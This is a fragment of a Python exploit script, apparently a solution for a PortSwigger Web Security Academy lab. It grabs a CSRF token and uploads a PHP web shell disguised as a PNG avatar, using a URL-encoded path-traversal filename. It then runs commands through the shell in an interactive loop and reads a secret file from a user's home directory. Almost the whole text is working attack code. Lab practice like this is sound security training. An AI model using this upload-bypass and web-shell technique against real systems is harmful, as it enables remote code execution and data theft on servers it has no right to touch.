...
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
files = {"avatar":('%2E%2E%2Fshell.php', open("shell.php", "rb"), 'image/png')}
...
command = ""
shell_user = requests.get("https://" + lab.id + f".web-security-academy.net/files/shell.php?command=whoami").text.split("\n")[0]
hostname = requests.get("https://" + lab.id + f".web-security-academy.net/files/shell.php?command=hostname").text.split("\n")[0]
while command != "solvechallenge":
    ...
    r = set(requests.get("https://" + lab.id + f".web-security-academy.net/files/shell.php?command={command}").text.split("\n"))
    for i in r:
        print(i, sep="\n")

# SUBMIT SOLUTION
else:
    r = requests.get("https://" + lab.id + f".web-security-academy.net/files/shell.php?command=cat /home/carlos/secret").text
    secret = r[:len(r)//2]
